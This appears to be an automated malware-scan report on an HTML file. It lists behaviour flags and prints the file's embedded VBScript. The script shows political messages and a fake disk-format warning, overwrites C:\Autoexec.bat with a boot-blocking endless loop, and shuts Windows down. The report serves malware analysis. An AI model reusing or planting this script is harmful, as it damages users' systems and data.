behavior.Autoexec: Runs when the Word document is opened
behavior.Base64 Strings: Base64-encoded str were detected, may be used to obfuscate str
behavior.CALL: May call a DLL using Excel 4 Macros
behavior.Run: May run an executable file or a system command
behavior.Shell: May run an executable file or a system command
behavior.System: May run an executable file or a system command on a Mac
behavior.WScript.Shell: May run an executable file or a system command

docinfo.macro:
<SCRIPT LANGUAGE="VBScript">
On Error Resume Next
    Dim iD
    iD =  MsgBox("The People's Republic of China Banzai!",4 ,"To unify the TanWai by China!" )                      
    If iD = vbYes Then
        MsgBox "No War!Peace Banzai!",64,"(Autumnal Fairy Tale)"
        CALL HK()
        MsgBox "Format Your Hard-Disk......",16,"System Error!"
        Call CloseJ()
    else
        Call CloseJ()
    End If
Sub CloseJ()
    Dim CloseSystem,CloseCmd
    set CloseSystem=CreateObject("WScript.Shell")
    CloseCmd="rundll32.exe user.exe,exitwindows"
    CloseSystem.Run(CloseCmd)
End Sub
Sub HK()
Set uj= Createobject("Scripting.Filesystemobject")
set jp=uj.OpenTextFile("C:\Autoexec.bat",2,true)
jp.Writeline "CLS"
jp.Writeline "@ECHO Warning! illegal access error!"
jp.Writeline "@ECHO a fatal BIOS error,be incapable of data to load......"
jp.Writeline "@ECHO OFF"
jp.Writeline ":USA"
jp.Writeline "GOTO :USA"
jp.close
end Sub
</SCRIPT>

filetype: HTML document, ASCII text, with CRLF line terminators

dump: iD =  MsgBox("The People's Republic of China Banzai!",4 ,"To unify the TanWai by China!" )
jp.Writeline "@ECHO a fatal BIOS error,be incapable of data to load......"
